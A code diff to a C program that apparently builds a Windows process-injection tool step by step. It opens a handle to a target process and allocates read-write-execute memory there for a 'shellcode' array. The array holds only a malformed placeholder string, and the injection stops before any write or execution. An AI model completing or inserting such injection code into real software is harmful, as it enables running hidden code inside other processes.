@@ -7,8 +7,10 @@ const char* INFO = "[*]";
 const char* ERR = "[-]";
 
 DWORD PID = NULL;
-HANDLE hProcess;
+HANDLE hProcess, hThread = NULL;
+LPVOID rBuffer = NULL;
 
+unsigned char shlcd[] = "x6e/x69/x72/x61/x6e/x6a/x61/x6e";
 int main(int argc, char* argv[])
 {
 	/*proces error catch*/
@@ -26,11 +28,17 @@ int main(int argc, char* argv[])
 		FALSE,
 		PID
 	);
-
+	/*Process handle creation*/
 	if (hProcess == NULL)
 	{
 		printf("%s couldnt get a handle to the process (%ld) error : %ld", ERR, PID, GetLastError());
 		return EXIT_FAILURE;
 	}
+
+	printf("%s got a handle to the process\n\\---0x%p\n", OK, hProcess);
+	/*blocking memory for alloc*/
+
+	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shlcd), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE perms\n", OK, sizeof(shlcd));
 	return EXIT_SUCCESS;
 }
